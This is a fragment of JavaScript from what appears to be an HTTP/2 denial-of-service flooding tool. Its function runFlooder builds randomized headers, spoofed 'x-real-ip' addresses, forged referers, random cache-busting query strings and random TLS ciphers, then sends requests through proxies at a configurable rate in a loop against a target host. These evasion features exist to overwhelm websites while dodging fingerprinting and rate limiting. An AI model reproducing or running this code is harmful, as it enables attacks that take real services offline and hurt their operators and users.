...
function runFlooder() {
    ...
    const randomIP = spoofIP();
    const randomCipher = randomElement(ciphersList);
    const randomSigalgs = randomElement(sigalgsList);
    
    let ZynosHeaders = {
      ":authority": parsedTarget.host,
      ":scheme": "https",
      ":path": (parsedTarget.path || "/") + "?" + randstr(6) + "=" + generateRandomString(10, 20) + "&" + randstr(4) + "=" + generateRandomString(8, 15),
      ":method": "GET",
      "accept": randomElement(acceptHeaders),
      "accept-encoding": randomElement(acceptEncoding),
      ...
      "pragma": "no-cache",
      "referer": randomElement(["https://google.com/", "https://www.facebook.com/", "https://www.youtube.com/", "https://twitter.com/", parsedTarget.href])
    };
    ...
    Socker.HTTP(proxyOptions, (connection, error) => {
        ...
        const tlsOptions = {
            ...
            ciphers: randomCipher,
            sigalgs: randomSigalgs,
                ...
                const interval = setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        const dynamicHeaders = {
                            ...
                            "x-real-ip": spoofIP(),
                            "referer": randomElement(["https://google.com/", "https://www.facebook.com/", "https://www.youtube.com/", parsedTarget.href])
                        };
